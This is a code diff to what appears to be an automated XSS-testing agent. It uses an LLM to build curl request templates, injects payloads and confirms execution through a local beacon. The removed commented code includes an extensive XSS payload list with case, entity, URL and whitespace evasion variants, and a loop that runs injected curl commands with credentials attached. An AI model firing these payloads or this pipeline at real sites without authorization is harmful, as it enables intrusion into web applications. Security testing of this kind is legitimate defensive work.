@@ -191,7 +191,7 @@ class XSSAgent:
         random_id = random.randint(100000, 999999)
 
         self._log(f"[Step 2: Generated Random ID (beacon token)]: {random_id}")
-        self._log(f"  Expected beacon URL: http://127.0.0.1:9091/?data={random_id}")
+        self._log(f"  Expected beacon callback with data={random_id}")
         self._log(f"")
 
         xss_payloads = self._get_xss_payloads(random_id)
@@ -199,107 +199,6 @@ class XSSAgent:
         for i, payload in enumerate(xss_payloads, 1):
             self._log(f"  {i}. {payload[:100]}{'...' if len(payload) > 100 else ''}")
         self._log(f"")
-
-        # self._log(f"[Step 4: Executing Tests]")
-        # payloads_tested = 0
-
-        # for template in curl_templates:
-        #     self._log(f"\n[Testing Template]: {template}")
-
-        #     # is_get_url = self._is_get_url_injection(template)
-
-        #     for payload in xss_payloads:
-        #         if not '{PAYLOAD}' in template:
-        #             self._log(f"  ⚠️  Template missing {{PAYLOAD}} placeholder, skipping")
-        #             continue
-
-        #         final_command = template.replace('{PAYLOAD}', payload)
-
-        #         final_command = append_credentials_to_curl(final_command, credentials)
-
-        #         self.execution_records[random_id] = {
-        #             "random_id": random_id,
-        #             "payload": payload,
-        #             "template": template,
-        #             "command": final_command,
-        #             "original_url": url,
-        #             "method": method
-        #         }
-
-        #         if is_get_url:
-        #             injected_url = self._extract_url_from_curl(final_command)
-        #             self._log(f"  [Payload]: {payload}")
-        #             self._log(f"  [Method]: driver.get()")
-        #             self._log(f"  [URL]: {injected_url}")
-
-        #             try:
-        #                 self.driver.get(injected_url)
-
-        #                 import time
-
-        #                 if check_beacon_detection(str(random_id)):
-        #                     self._log(f"  ✓✓✓ XSS TRIGGERED via BEACON! Random ID {random_id} detected in log!")
-        #                     self.triggered_tokens.add(str(random_id))
-        #                     payloads_tested += 1
-        #                     self._log(f"  🎯 XSS confirmed, stopping further tests for this request")
-        #                     vulnerable = True
-
-        #                 try:
-        #                     arr = self.driver.execute_script("return window.xss_array || [];")
-        #                     self._log(f"  [Current XSS Array]: {arr}")
-
-        #                     if arr:
-        #                         for xss_id in arr:
-        #                             self.xss_array.add(xss_id)
-        #                             if xss_id == random_id:
-        #                                 self._log(f"  ✓ XSS also detected in xss_array! Random ID {random_id}")
-        #                                 payloads_tested += 1
-        #                                 self._log(f"  🎯 XSS confirmed via xss_array, stopping further tests")
-        #                                 vulnerable = True
-        #                 except Exception as e:
-        #                     self._log(f"  ⚠️  Failed to check xss_array: {e}")
-
-        #                 if vulnerable:
-        #                     break
-
-        #                 self._log(f"  ✓ Executed via driver")
-        #                 payloads_tested += 1
-
-        #             except Exception as e:
-        #                 self._log(f"  ✗ Failed: {e}")
-
-        #         else:
-        #             self._log(f"  [Payload]: {payload}")
-        #             self._log(f"  [Method]: curl subprocess")
-        #             self._log(f"  [Command]: {final_command}")
-
-        #             try:
-        #                 process = subprocess.Popen(
-        #                     final_command,
-        #                     shell=True,
-        #                     stdout=subprocess.PIPE,
-        #                     stderr=subprocess.PIPE,
-        #                     text=True
-        #                 )
-        #                 stdout, stderr = process.communicate(timeout=10)
-
-        #                 from attack_agent.request_utils import parse_http_status_from_response
-        #                 http_status, response_body = parse_http_status_from_response(stdout)
-
-        #                 self._log(f"  ✓ Executed via curl (curl_exit_code: {process.returncode})")
-        #                 if http_status is not None:
-        #                     self._log(f"  HTTP Status: {http_status}")
-        #                 self._log(f"  Response length: {len(response_body)} bytes")
-        #                 extracted_body = extract_useful_response(response_body, max_length=2000)
-        #                 self._log(f"  Response (extracted): {extracted_body}")
-        #                 if stderr:
-        #                     self._log(f"  Stderr: {stderr}")
-        #                 payloads_tested += 1
-
-        #             except subprocess.TimeoutExpired:
-        #                 self._log(f"  ✗ Timeout after 10 seconds")
-        #             except Exception as e:
-        #                 self._log(f"  ✗ Failed: {e}")
 
         self._log(f"[Step 4: Executing Tests]")
         payloads_tested = 0
@@ -311,7 +210,7 @@ class XSSAgent:
 
             for payload in xss_payloads:
                 if '{PAYLOAD}' not in template:
-                    self._log(f"  ⚠️  Template missing {{PAYLOAD}} placeholder, skipping")
+                    self._log(f"   Template missing {{PAYLOAD}} placeholder, skipping")
                     continue
 
                 final_command = template.replace('{PAYLOAD}', payload)
@@ -353,7 +252,7 @@ class XSSAgent:
                     
                     if current_reflected:
                         any_payload_reflected = True
-                        self._log(f"  ⚠️  [Reflection] Payload reflected verbatim in response body! (High Suspicion)")
+                        self._log(f"   [Reflection] Payload reflected verbatim in response body! (High Suspicion)")
                         
                     self._log(f"  ✓ Executed via curl (curl_exit_code: {process.returncode})")
                     if http_status is not None:
@@ -370,7 +269,7 @@ class XSSAgent:
 
                     if is_html and self.driver:
                         if self._render_and_check_xss(body, random_id):
-                            self._log(f"  🎯 XSS confirmed, stopping further tests for this request")
+                            self._log(f"  XSS confirmed, stopping further tests for this request")
                             vulnerable = True
                             payloads_tested += 1
                             break
@@ -384,15 +283,6 @@ class XSSAgent:
 
             if vulnerable:
                 break
-
-        # self._log(f"\n[Step 5: Checking Beacon Detection]")
-        # # vulnerable = check_beacon_detection(str(random_id))
-
-        # if vulnerable:
-        #     self._log(f"  ✓✓✓ BEACON DETECTION: Random ID {random_id} found in log!")
-        #     self.triggered_tokens.add(str(random_id))
-        # else:
-        #     self._log(f"  ✗ Beacon not detected (random_id {random_id} not in log)")
 
         self._log(f"\n[Step 5: Checking Beacon Detection]")
         if not vulnerable:
@@ -430,21 +320,6 @@ class XSSAgent:
             "llm_analysis": llm_analysis,
             "note": f"Stage 1 - Result: {final_status}. (Reflected: {any_payload_reflected}, Executed: {vulnerable})"
         }
-    
-        # if vulnerable:
-        #     self._log(f"  Result: VULNERABLE (XSS confirmed)")
-        # else:
-        #     self._log(f"  Result: SAFE (no XSS triggered in immediate tests)")
-
-
-        # self._log(f"{'='*70}\n")
-
-        # return {
-        #     "vulnerable": vulnerable,
-        #     "payloads_tested": payloads_tested,
-        # "llm_analysis": llm_analysis,
-        #     "note": f"Stage 1 - Immediate detection: {'XSS confirmed' if vulnerable else 'Pending finalize'}"
-        # }
 
     def _generate_curl_templates(self, request: Dict[str, Any]) -> tuple:
         """
@@ -538,234 +413,6 @@ Please analyze this request and generate curl command templates with {{PAYLOAD}}
 
         return templates
 
-    # def _get_xss_payloads(self, random_id: int) -> List[str]:
-    #     """
-    #     Generate XSS payload list (covers multiple injection contexts and encodings)
-
-    #     Args:
-    #         random_id: random ID sent to beacon and stored in xss_array
-
-    #     Returns:
-    #         Returns payload list categorized by context (with encoding variants)
-    #     """
-    #     payloads = []
-
-    # # basic HTML context
-    #     payloads.extend([
-    #         f"<script>xss({random_id})</script>",
-    #         f"\"'><script>xss({random_id})</script>",
-    #         f"<ScRiPt>xss({random_id})</sCrIpT>",
-    #         f"<SCRIPT>xss({random_id})</SCRIPT>",
-    #         f"&#60;script&#62;xss({random_id})&#60;/script&#62;",
-    #         f"&#x3c;script&#x3e;xss({random_id})&#x3c;/script&#x3e;",
-    #     ])
-
-    # # auto-trigger event handlers
-    #     payloads.extend([
-    # # base payload
-    #         f'<img src="x" onerror="xss({random_id})">',
-    #         f'<svg onload="xss({random_id})">',
-    #         f'<body onload="xss({random_id})">',
-    #         f'<iframe onload="xss({random_id})"></iframe>',
-    #         f'<video onloadstart="xss({random_id})"><source></video>',
-    #         f'<audio onloadstart="xss({random_id})"><source></audio>',
-
-    #         f'<IMG SRC="x" ONERROR="xss({random_id})">',
-    #         f'<ImG sRc="x" OnErRoR="xss({random_id})">',
-    #         f'<SVG ONLOAD="xss({random_id})">',
-    #         f'<SvG oNlOaD="xss({random_id})">',
-
-    #         f'<img src="x" &#111;&#110;&#101;&#114;&#114;&#111;&#114;="xss({random_id})">',
-    #         f'<svg &#111;&#110;&#108;&#111;&#97;&#100;="xss({random_id})">',
-
-    #         f'<img src="x" &#x6f;&#x6e;&#x65;&#x72;&#x72;&#x6f;&#x72;="xss({random_id})">',
-
-    #         f'<img src="x" onerror="xss%28{random_id}%29">',
-    #     ])
-
-    #     payloads.extend([
-    #         f'<input onfocus="xss({random_id})" autofocus>',
-    #         f'<select onfocus="xss({random_id})" autofocus><option>x</option></select>',
-    #         f'<textarea onfocus="xss({random_id})" autofocus></textarea>',
-    #         f'<marquee onstart="xss({random_id})">XSS</marquee>',
-    #         f'<details open ontoggle="xss({random_id})">',
-
-    #         f'<INPUT ONFOCUS="xss({random_id})" AUTOFOCUS>',
-    #         f'<TEXTAREA OnFoCuS="xss({random_id})" autofocus></TEXTAREA>',
-    #     ])
-
-    # # JavaScript pseudo-protocol
-    #     payloads.extend([
-    # # base payload
-    #         f'<a href="javascript:xss({random_id})">click</a>',
-    #         f'<iframe src="javascript:xss({random_id})"></iframe>',
-    #         f'<form action="javascript:xss({random_id})"><input type="submit"></form>',
-    #         f'<object data="javascript:xss({random_id})">',
-
-    #         f'<a href="javascript%3axss({random_id})">click</a>',
-    #         f'<iframe src="javascript%3axss%28{random_id}%29"></iframe>',
-
-    #         f'<a href="JaVaScRiPt:xss({random_id})">click</a>',
-    #         f'<iframe src="JAVASCRIPT:xss({random_id})"></iframe>',
-
-    #         f'<a href="java\tscript:xss({random_id})">click</a>',
-    #         f'<a href="java\nscript:xss({random_id})">click</a>',
-    #         f'<a href="java\rscript:xss({random_id})">click</a>',
-
-    #         f'<a href="javascript:xss&#x28;{random_id}&#x29;">click</a>',
-
-    #         f'<a href="javascript:\\u0078ss({random_id})">click</a>',
-    #     ])
-
-    # # attribute context (double quote)
-    #     payloads.extend([
-    #         f'x" onerror="xss({random_id})" z="',
-    #         f'x" onload="xss({random_id})" z="',
-    #         f'x" onfocus="xss({random_id})" autofocus z="',
-
-    #         f'x" &#111;&#110;&#101;&#114;&#114;&#111;&#114;="xss({random_id})" z="',
-
-    #         f'x" OnErRoR="xss({random_id})" z="',
-    #         f'x" ONERROR="xss({random_id})" z="',
-    #     ])
-
-    # # attribute context (single quote)
-    #     payloads.extend([
-    #         f"x' onerror='xss({random_id})' z='",
-    #         f"x' onload='xss({random_id})' z='",
-
-    #         f"x' OnErRoR='xss({random_id})' z='",
-    #         f"x' ONLOAD='xss({random_id})' z='",
-    #     ])
-
-    # # unquoted attribute context
-    #     payloads.extend([
-    #         f"x onclick=xss({random_id}) z=",
-    #         f"x onload=xss({random_id}) z=",
-
-    #         f"x OnClick=xss({random_id}) z=",
-    #         f"x ONLOAD=xss({random_id}) z=",
-    #     ])
-
-    # # tag break-out
-    #     payloads.extend([
-    #         f"</title><script>xss({random_id})</script>",
-    #         f"</textarea><script>xss({random_id})</script>",
-    #         f"</style><script>xss({random_id})</script>",
-    #         f"</noscript><script>xss({random_id})</script>",
-    #         f"</script><script>xss({random_id})</script>",
-
-    #         f"</TITLE><ScRiPt>xss({random_id})</sCrIpT>",
-    #         f"</TEXTAREA><SCRIPT>xss({random_id})</SCRIPT>",
-
-    #         f"&#60;/title&#62;&#60;script&#62;xss({random_id})&#60;/script&#62;",
-    #     ])
-
-    # # HTML comment break-out
-    #     payloads.extend([
-    #         f"--><script>xss({random_id})</script><!--",
-    #         f"--!><script>xss({random_id})</script><!--",
-
-    #         f"--><ScRiPt>xss({random_id})</sCrIpT><!--",
-    #     ])
-
-    # # JavaScript string context
-    #     payloads.extend([
-    # # base payload
-    #         f"';xss({random_id});//",
-    #         f"\";xss({random_id});//",
-    #         f"`;xss({random_id});//",
-    #         f"</script><script>xss({random_id})</script><script>",
-
-    #         f"';\\u0078ss({random_id});//",
-    #         f"\";\\u0078ss({random_id});//",
-
-    #         f"';\\x78ss({random_id});//",
-    #         f"\";\\x78ss({random_id});//",
-
-    #         f"';\\170ss({random_id});//",
-
-    #         f"';\nxss({random_id});//",
-    #         f"';\rxss({random_id});//",
-
-    #         f"';xss({random_id});/*",
-    #         f"';xss({random_id});<!--",
-    #     ])
-
-    # # JavaScript variable/object context
-    #     payloads.extend([
-    #         f";xss({random_id})//",
-    #         f",xss({random_id})//",
-    #         f");xss({random_id});//",
-
-    #         f"; xss({random_id})//",
-    #         f",\txss({random_id})//",
-    #         f");\nxss({random_id});//",
-    #     ])
-
-    # # CSS injection (style attribute)
-    #     payloads.extend([
-    #         f'x;color:red;}}</style><script>xss({random_id})</script><style>',
-    # f"x:expression(xss({random_id}))",  # IE-specific
-
-    #         f'x;color:red;}}</STYLE><SCRIPT>xss({random_id})</SCRIPT><STYLE>',
-    #         f"x:EXPRESSION(xss({random_id}))",
-
-    #         f'x;color:red;%7d</style><script>xss({random_id})</script><style>',
-    #     ])
-
-    # # self-closing tags
-    #     payloads.extend([
-    #         f'<input onfocus="xss({random_id})" autofocus>',
-    #         f'<embed src="javascript:xss({random_id})">',
-    #         f'<use xlink:href="javascript:xss({random_id})"></use>',
-
-    #         f'<INPUT OnFoCuS="xss({random_id})" AUTOFOCUS>',
-    #         f'<EMBED SRC="javascript:xss({random_id})">',
-    #     ])
-
-    #     payloads.extend([
-    # # base payload
-    #         f'<object data="data:text/html,<script>xss({random_id})</script>">',
-    #         f'<iframe src="data:text/html,<script>xss({random_id})</script>">',
-
-    #         f'<iframe src="data:text/html;base64,PHNjcmlwdD54c3Moe3JhbmRvbV9pZH0pPC9zY3JpcHQ+">',
-
-    #         f'<object data="data:text/html,%3Cscript%3Exss({random_id})%3C/script%3E">',
-
-    #         f'<IFRAME SRC="data:text/html,<script>xss({random_id})</script>">',
-    #     ])
-
-    #     payloads.extend([
-    #         f'<meta http-equiv="refresh" content="0;url=javascript:xss({random_id})">',
-
-    #         f'<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:xss({random_id})">',
-
-    #         f'<meta http-equiv="refresh" content="0;url=javascript%3axss({random_id})">',
-    #     ])
-
-    #     payloads.extend([
-    #         f'<style>@keyframes x{{}}body{{animation-name:x}}</style><body onanimationstart="xss({random_id})">',
-    #         f'<div style="transition:all 1s" ontransitionend="xss({random_id})">',
-    #     ])
-
-    #     payloads.extend([
-    #         f'<svg/onload="xss({random_id})">',
-    #         f'<svg//onload="xss({random_id})">',
-
-    #         f'<img\tsrc=x\tonerror="xss({random_id})">',
-
-    #         f'<img\nsrc=x\nonerror="xss({random_id})">',
-    #         f'<img\rsrc=x\ronerror="xss({random_id})">',
-
-    #         f'<svg\r\nonload="xss({random_id})">',
-    #         f'<img\t\n\rsrc=x\t\n\ronerror="xss({random_id})">',
-
-    #         f'<img src="x" onerror="xss({random_id})">',
-    #     ])
-
-    #     return payloads
-
     def _get_xss_payloads(self, random_id: int) -> List[str]:
         """
         Generate XSS payload list (covers multiple injection contexts and encodings)
@@ -854,49 +501,9 @@ Please analyze this request and generate curl command templates with {{PAYLOAD}}
 
         return payloads
 
-    # def _is_get_url_injection(self, curl_template: str) -> bool:
-    #     """
-    #     GETpayloadURL
-
-    #     Args:
-    #         curl_template: curl
-
-    #     Returns:
-    #         TrueGET URL
-    #     """+
-    #     is_get = '-X GET' in curl_template or \
-    #             ('{PAYLOAD}' in curl_template and '-X POST' not in curl_template and '-d' not in curl_template)
-
-
-    #     return is_get and has_url_payload
-
-    # def _extract_url_from_curl(self, curl_command: str) -> str:
-    #     """
-    #     curlURL（ - #URL）
-
-    #     Args:
-    #         curl_command: curl
-
-    #     Returns:
-    #         URL
-    #     """
-    #     match = re.search(r"curl\s+(?:-X\s+\w+\s+)?'(.+?)'", curl_command)
-    #     if match:
-    #         return match.group(1)
-
-    #     match = re.search(r"curl\s+(?:-X\s+\w+\s+)?\"(.+?)\"", curl_command)
-    #     if match:
-    #         return match.group(1)
-
-    #     match = re.search(r"curl\s+(?:-X\s+\w+\s+)?([^\s'\"]+)", curl_command)
-    #     if match:
-    #         return match.group(1)
-
-    #     return ""
-
     def _ensure_curl_include_headers(self, curl_command: str) -> str:
         """
-        curl -i / --include（HTTP）
+        curl -i / --include(HTTP)
         """
         if '-i' not in curl_command and '--include' not in curl_command:
             return curl_command.replace('curl ', 'curl -i ', 1)
@@ -904,7 +511,7 @@ Please analyze this request and generate curl command templates with {{PAYLOAD}}
 
     def _parse_curl_response(self, curl_output: str):
         """
-         curl -i ：
+         curl -i :
          (http_status:int|None, headers:dict, body:str)
         """
         lines = curl_output.split('\n')
@@ -931,7 +538,7 @@ Please analyze this request and generate curl command templates with {{PAYLOAD}}
 
     def _is_html_response(self, headers: dict, body: str) -> bool:
         """
-        HTML：
+        HTML:
         -  Content-Type
         -
         """
@@ -951,51 +558,6 @@ Please analyze this request and generate curl command templates with {{PAYLOAD}}
             ])
 
         return False
-
-    # def _render_and_check_xss(self, html_content: str, random_id: int) -> bool:
-    #     """
-    #     Render HTML with driver and check if XSS triggered
-    #     """
-    #     import base64
-    #     import time
-
-    #     self._log(f"  [Rendering HTML with driver...]")
-
-    #     try:
-    #         # 1. HTML -> base64 data URL
-    #         b64_html = base64.b64encode(html_content.encode('utf-8')).decode('utf-8')
-    #         data_url = f"data:text/html;base64,{b64_html}"
-
-    # # 2. load with driver
-    #         self.driver.get(data_url)
-
-    # # 3. wait for payload to execute
-    #         time.sleep(0.5)
-
-    # # 4. check beacon
-    #         if check_beacon_detection(str(random_id)):
-    #             self._log(f"  ✓✓✓ XSS TRIGGERED via BEACON! Random ID {random_id}")
-    #             self.triggered_tokens.add(str(random_id))
-    #             return True
-
-    # # 5. check window.xss_array
-    #         try:
-    #             arr = self.driver.execute_script("return window.xss_array || [];")
-    #             self._log(f"  [XSS Array]: {arr}")
-
-    #             if random_id in arr:
-    #                 self._log(f"  ✓ XSS TRIGGERED via xss_array! Random ID {random_id}")
-    #                 self.xss_array.add(random_id)
-    #                 return True
-    #         except Exception as e:
-    #             self._log(f"  ⚠️  Failed to check xss_array: {e}")
-
-    #         self._log(f"  ✗ XSS not triggered in rendered HTML")
-    #         return False
-
-    #     except Exception as e:
-    #         self._log(f"  ✗ Rendering failed: {e}")
-    #         return False
 
     def _is_crash_prone_page(self, html_content: str) -> bool:
         """
@@ -1067,7 +629,7 @@ Please analyze this request and generate curl command templates with {{PAYLOAD}}
                     self.xss_array.add(random_id)
                     return True
             except Exception as e:
-                self._log(f"  ⚠️  Failed to check xss_array: {e}")
+                self._log(f"   Failed to check xss_array: {e}")
 
             self._log(f"  ✗ XSS not triggered in rendered HTML")
             return False
@@ -1100,7 +662,7 @@ Please analyze this request and generate curl command templates with {{PAYLOAD}}
             return True
             
         except Exception as e:
-            self._log(f"  ⚠️  Failed to save screenshot: {e}")
+            self._log(f"   Failed to save screenshot: {e}")
             return False
 
     def _extract_url_from_curl(self, curl_command: str) -> str:
@@ -1118,213 +680,6 @@ Please analyze this request and generate curl command templates with {{PAYLOAD}}
             return match.group(1)
 
         return ""
-
-    # def _execute_stage2(self, request: Dict[str, Any], credentials: Dict[str, Any],
-    #                    stage1_context: Dict[str, Any]) -> Dict[str, Any]:
-    #     """
-    #     Execute Stage 2 reflection attack (OOB detection)
-
-    #     CMDI
-    #     """
-    # # 1. build reflection suffix
-    #     self._log(f"[Reflection] Building reflection analysis...")
-    #     reflection_suffix = self._build_reflection_suffix(stage1_context)
-
-    # # 2. call LLM for new templates
-    #     self._log(f"[Step 1: Generating Reflection Templates via LLM]")
-    #     new_templates, llm_reflection_output = self._generate_curl_templates_with_reflection(
-    #         request=request,
-    #         reflection_suffix=reflection_suffix
-    #     )
-
-    #     if not new_templates:
-    #         self._log(f"[Reflection] LLM did not generate new templates, returning Stage 1 result")
-    #         stage1_context["reflection_attempted"] = True
-    #         stage1_context["reflection_note"] = "No new templates generated"
-    #         return stage1_context
-
-    #     self._log(f"[LLM Generated {len(new_templates)} new template(s)]:")
-    #     for i, tmpl in enumerate(new_templates, 1):
-    #         self._log(f"  {i}. {tmpl}")
-    #     self._log(f"")
-
-    # # 3. generate new random_id
-    #     random_id = random.randint(100000, 999999)
-    #     self._log(f"[Step 2: Generated New Random ID (beacon token)]: {random_id}")
-    #     self._log(f"  Expected beacon URL: http://127.0.0.1:9091/?data={random_id}")
-    #     self._log(f"")
-
-    # # 4. generate XSS payload list
-    #     xss_payloads = self._get_xss_payloads(random_id)
-    #     self._log(f"[Step 3: Generated {len(xss_payloads)} XSS Payloads]:")
-    #     for i, payload in enumerate(xss_payloads, 1):
-    #         self._log(f"  {i}. {payload[:100]}{'...' if len(payload) > 100 else ''}")
-    #     self._log(f"")
-
-    #     self._log(f"[Step 4: Executing Tests]")
-    #     payloads_tested = 0
-    #     method = request.get("method", "GET")
-    #     url = request.get("url", "")
-    #     vulnerable = False
-
-    #     for template in new_templates:
-    #         self._log(f"\n[Testing Template]: {template}")
-
-    #         # is_get_url = self._is_get_url_injection(template)
-
-    #         for payload in xss_payloads:
-    #             if '{PAYLOAD}' not in template:
-    #                 self._log(f"  ⚠️  Template missing {{PAYLOAD}} placeholder, skipping")
-    #                 continue
-
-    #             final_command = template.replace('{PAYLOAD}', payload)
-    #             final_command = append_credentials_to_curl(final_command, credentials)
-
-    #             self.execution_records[random_id] = {
-    #                 "random_id": random_id,
-    #                 "payload": payload,
-    #                 "template": template,
-    #                 "command": final_command,
-    #                 "original_url": url,
-    #                 "method": method
-    #             }
-
-    #             if is_get_url:
-    #                 injected_url = self._extract_url_from_curl(final_command)
-    #                 self._log(f"  [Payload]: {payload}")
-    #                 self._log(f"  [Method]: driver.get()")
-    #                 self._log(f"  [URL]: {injected_url}")
-
-    #                 try:
-    #                     self.driver.get(injected_url)
-
-    #                     import time
-    #                     time.sleep(0.5)
-
-    #                     if check_beacon_detection(str(random_id)):
-    #                         self._log(f"  ✓✓✓ XSS TRIGGERED via BEACON! Random ID {random_id} detected in log!")
-    #                         self.triggered_tokens.add(str(random_id))
-    #                         payloads_tested += 1
-    #                         self._log(f"  🎯 XSS confirmed, stopping further tests")
-    #                         vulnerable = True
-    #                         break
-
-    #                     try:
-    #                         arr = self.driver.execute_script("return window.xss_array || [];")
-    #                         self._log(f"  [Current XSS Array]: {arr}")
-
-    #                         if arr:
-    #                             for xss_id in arr:
-    #                                 self.xss_array.add(xss_id)
-    #                                 if xss_id == random_id:
-    #                                     self._log(f"  ✓ XSS also detected in xss_array! Random ID {random_id}")
-    #                                     payloads_tested += 1
-    #                                     self._log(f"  🎯 XSS confirmed via xss_array")
-    #                                     vulnerable = True
-    #                                     break
-    #                     except Exception as e:
-    #                         self._log(f"  ⚠️  Failed to check xss_array: {e}")
-
-    #                     if vulnerable:
-    #                         break
-
-    #                     self._log(f"  ✓ Executed via driver")
-    #                     payloads_tested += 1
-
-    #                 except Exception as e:
-    #                     self._log(f"  ✗ Failed: {e}")
-
-    #             else:
-    #                 self._log(f"  [Payload]: {payload}")
-    #                 self._log(f"  [Method]: curl subprocess")
-    #                 self._log(f"  [Command]: {final_command}")
-
-    #                 try:
-    #                     process = subprocess.Popen(
-    #                         final_command,
-    #                         shell=True,
-    #                         stdout=subprocess.PIPE,
-    #                         stderr=subprocess.PIPE,
-    #                         text=True
-    #                     )
-    #                     stdout, stderr = process.communicate(timeout=10)
-
-    #                     from attack_agent.request_utils import parse_http_status_from_response
-    #                     http_status, response_body = parse_http_status_from_response(stdout)
-
-    #                     self._log(f"  ✓ Executed via curl (curl_exit_code: {process.returncode})")
-    #                     if http_status is not None:
-    #                         self._log(f"  HTTP Status: {http_status}")
-    #                     self._log(f"  Response length: {len(response_body)} bytes")
-    #                     extracted_body = extract_useful_response(response_body, max_length=2000)
-    #                     self._log(f"  Response (extracted): {extracted_body}")
-    #                     if stderr:
-    #                         self._log(f"  Stderr: {stderr}")
-    #                     payloads_tested += 1
-
-    #                 except subprocess.TimeoutExpired:
-    #                     self._log(f"  ✗ Timeout after 10 seconds")
-    #                 except Exception as e:
-    #                     self._log(f"  ✗ Failed: {e}")
-
-    #         if vulnerable:
-    #             break
-
-    #     self._log(f"\n[Step 5: Checking Beacon Detection]")
-    #     if not vulnerable:
-    #         vulnerable = check_beacon_detection(str(random_id))
-
-    #     if vulnerable:
-    #         self._log(f"  ✓✓✓ BEACON DETECTION: Random ID {random_id} found in log!")
-    #         self.triggered_tokens.add(str(random_id))
-    #     else:
-    #         self._log(f"  ✗ Beacon not detected (random_id {random_id} not in log)")
-
-    # # 7. check xss_array
-    #     if not vulnerable and random_id in self.xss_array:
-    #         self._log(f"  ✓ XSS_ARRAY DETECTION: Random ID {random_id} found!")
-    #         vulnerable = True
-
-    #     self._log(f"\n{'='*70}")
-    #     self._log(f"[XSS Test Summary - Stage 2]")
-    #     self._log(f"  Total Payloads Tested: {payloads_tested}")
-    #     self._log(f"  Random ID (beacon token): {random_id}")
-    #     self._log(f"  Beacon Triggered: {str(random_id) in self.triggered_tokens}")
-    #     self._log(f"  XSS Array Count: {len(self.xss_array)}")
-
-    #     # if vulnerable:
-    #     #     self._log(f"  Result: VULNERABLE (XSS confirmed in Stage 2)")
-    #     # else:
-    #     #     has_get_test = any(self._is_get_url_injection(tmpl) for tmpl in new_templates)
-    #     #     if has_get_test:
-    #     #         self._log(f"  Result: SAFE (GET requests tested, no XSS triggered)")
-    #     #     else:
-    #     #         vulnerable = None
-    #     #         self._log(f"  Result: PENDING (waiting for finalize to check stored XSS)")
-
-    #     if vulnerable:
-    #         self._log(f"  Result: VULNERABLE (XSS confirmed)")
-    #     else:
-    #         self._log(f"  Result: SAFE (no XSS triggered in immediate tests)")
-
-    #     self._log(f"{'='*70}\n")
-
-    #     return {
-    #         "vulnerable": vulnerable,
-    #         "stage": 2,
-    #         "payloads_tested": payloads_tested,
-    #         "random_id": random_id,
-    #         "curl_templates": new_templates,
-    #         "llm_reflection_output": llm_reflection_output,
-    #         "reflection_analysis": reflection_suffix,
-    #         "stage1_results": {
-    #             "curl_templates": stage1_context.get("curl_templates", []),
-    #             "payloads_tested": stage1_context.get("payloads_tested", 0),
-    #             "random_id": stage1_context.get("random_id"),
-    #             "llm_analysis": stage1_context.get("llm_analysis", "")
-    #         },
-    #         "note": f"Stage 2 - Reflection attack: {'XSS confirmed' if vulnerable else 'Pending finalize'}"
-    #     }
 
     def _execute_stage2(self, request: Dict[str, Any], credentials: Dict[str, Any],
                     stage1_context: Dict[str, Any]) -> Dict[str, Any]:
@@ -1353,7 +708,7 @@ Please analyze this request and generate curl command templates with {{PAYLOAD}}
 
         random_id = random.randint(100000, 999999)
         self._log(f"[Step 2: Generated New Random ID (beacon token)]: {random_id}")
-        self._log(f"  Expected beacon URL: http://127.0.0.1:9091/?data={random_id}")
+        self._log(f"  Expected beacon callback with data={random_id}")
         self._log(f"")
 
         xss_payloads = self._get_xss_payloads(random_id)
@@ -1374,7 +729,7 @@ Please analyze this request and generate curl command templates with {{PAYLOAD}}
 
             for payload in xss_payloads:
                 if '{PAYLOAD}' not in template:
-                    self._log(f"  ⚠️  Template missing {{PAYLOAD}} placeholder, skipping")
+                    self._log(f"   Template missing {{PAYLOAD}} placeholder, skipping")
                     continue
 
                 final_command = template.replace('{PAYLOAD}', payload)
@@ -1417,7 +772,7 @@ Please analyze this request and generate curl command templates with {{PAYLOAD}}
                     
                     if current_reflected:
                         any_payload_reflected = True
-                        self._log(f"  ⚠️  [Reflection] Payload reflected verbatim in response body! (High Suspicion)")
+                        self._log(f"   [Reflection] Payload reflected verbatim in response body! (High Suspicion)")
 
                     self._log(f"  ✓ Executed via curl (curl_exit_code: {process.returncode})")
                     if http_status is not None:
@@ -1434,7 +789,7 @@ Please analyze this request and generate curl command templates with {{PAYLOAD}}
 
                     if is_html and self.driver:
                         if self._render_and_check_xss(body, random_id):
-                            self._log(f"  🎯 XSS confirmed in Stage 2, stopping further tests")
+                            self._log(f"  XSS confirmed in Stage 2, stopping further tests")
                             vulnerable = True
                             payloads_tested += 1
                             break
@@ -1472,13 +827,6 @@ Please analyze this request and generate curl command templates with {{PAYLOAD}}
         self._log(f"  Random ID (beacon token): {random_id}")
         self._log(f"  Beacon Triggered: {str(random_id) in self.triggered_tokens}")
         self._log(f"  XSS Array Count: {len(self.xss_array)}")
-
-        # if vulnerable:
-        #     self._log(f"  Result: VULNERABLE (XSS confirmed in Stage 2)")
-        # else:
-        #     self._log(f"  Result: SAFE (no XSS triggered in Stage 2 immediate tests)")
-
-        # self._log(f"{'='*70}\n")
 
         final_status = "SAFE"
         if vulnerable:
